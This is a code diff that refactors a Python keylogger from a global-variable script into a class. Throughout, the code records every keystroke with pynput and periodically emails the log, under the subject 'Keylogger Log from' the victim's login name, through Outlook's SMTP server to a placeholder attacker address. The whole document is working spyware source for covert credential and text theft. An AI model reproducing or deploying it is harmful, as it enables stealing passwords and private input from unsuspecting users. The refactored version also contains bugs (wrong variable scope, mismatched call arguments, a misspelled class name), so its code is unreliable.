@@ -1,80 +1,85 @@
-from pynput import keyboard as kb
-import smtplib
-import threading 
 import os
+import smtplib
 import tempfile
-from email.mime.multipart import MIMEMultipart
+import threading 
+from pynput import keyboard as kb
 from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
-email1 = "userMail_"
-password1 = "userPassword_"
-timeout1 = int("timeOut_")
+class KeyLogger():
+    def __init__(self, email : str, password : str, timeout : int) -> None:
+        self.email    : str = email
+        self.password : str = password
+        self.timeout  : int = timeout
+        self.log      : str = ""
+        
+    def callback(self, key : str) -> None:
+        try:
+            log = log + str(key.char)
+            
+        except AttributeError:
+            if key == key.space:
+                log += " "
+                
+            else:
+                log = log + f" [{str(key).replace('KEY.', '')}]"
+        except:
+            pass
+        
+    def send_mail(self, file_name : str) -> None:
+        host = os.getlogin()
+        try:
+            email_server : smtplib.SMTP = smtplib.SMTP("smtp-mail.outlook.com", 587)
+            email_server.starttls()
+            email_server.login(self.email, self.password)
+            
+            message : MIMEMultipart = MIMEMultipart()
+            message["From"] = "Shypy"
+            message["To"] = self.email
+            message["Subject"] = f"Keylogger Log from {host}"
+            
+            with open(file_name, "r") as attachment:
+                part : MIMEText = MIMEText(attachment.read())
+            
+            part.add_header(
+                "Content-Disposition",
+                f"attachment; filename= {os.path.basename(file_name)}",
+            )
+            
+            message.attach(part)
+            text = message.as_string()
+            email_server.sendmail(self.email, self.email, text)
+            email_server.quit()
+            
+            self.log = ""
+            
+            os.remove(file_name)
+            
+        except Exception as e:
+            print("Error:", e)
+    
+    def thread_function(self) -> None:
+        try:
+            with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as temp_file:
+                temp_filename = temp_file.name
+                temp_file.write(self.log.encode("utf-8"))
+            
+            self.send_mail(self.email, self.password, temp_filename)
+            
+            timer_object = threading.Timer(self.timeout, self.thread_function)
+            timer_object.start()
+            
+        except:
+            wait_time = 60
+            timer = threading.Timer(wait_time, self.thread_function)
+            timer.start()
+        
+    def run(self) -> None:
+        keyboard_listener : kb.Listene = kb.Listener(on_press=self.callback)
 
-log = ""
+        with keyboard_listener:
+            self.thread_function()
+            keyboard_listener.join()
 
-def callback_function(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log += " "
-        else:
-            log = log + f" [{str(key).replace('KEY.', '')}]"
-    except:
-        pass
-    print(log)
-
-def mail_sendder(email, password, filename):
-    global log
-    host = os.getlogin()
-    try:
-        email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)
-        email_server.starttls()
-        email_server.login(email, password)
-        
-        message = MIMEMultipart()
-        message["From"] = email
-        message["To"] = email
-        message["Subject"] = f"Keylogger Log from {host}"
-        
-        with open(filename, "r") as attachment:
-            part = MIMEText(attachment.read())
-        
-        part.add_header(
-            "Content-Disposition",
-            f"attachment; filename= {os.path.basename(filename)}",
-        )
-        
-        message.attach(part)
-        text = message.as_string()
-        email_server.sendmail(email, email, text)
-        email_server.quit()
-        
-        log = ""
-        
-        os.remove(filename)
-    except Exception as e:
-        print("Error:", e)
-
-def thread_function():
-    global log
-    try:
-        with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as temp_file:
-            temp_filename = temp_file.name
-            temp_file.write(log.encode("utf-8"))
-        
-        mail_sendder(email1, password1, temp_filename)
-        
-        timer_object = threading.Timer(timeout1, thread_function)
-        timer_object.start()
-    except:
-        wait_time = 60
-        timer = threading.Timer(wait_time, thread_function)
-        timer.start()
-
-keyboard_listener = kb.Listener(on_press = callback_function)
-
-with keyboard_listener:
-    thread_function()
-    keyboard_listener.join()
+if __name__ == "__main__":
+    KeyLogger(email="userMail_", password="userPassword_", timeout=int("timeOut_")).run()
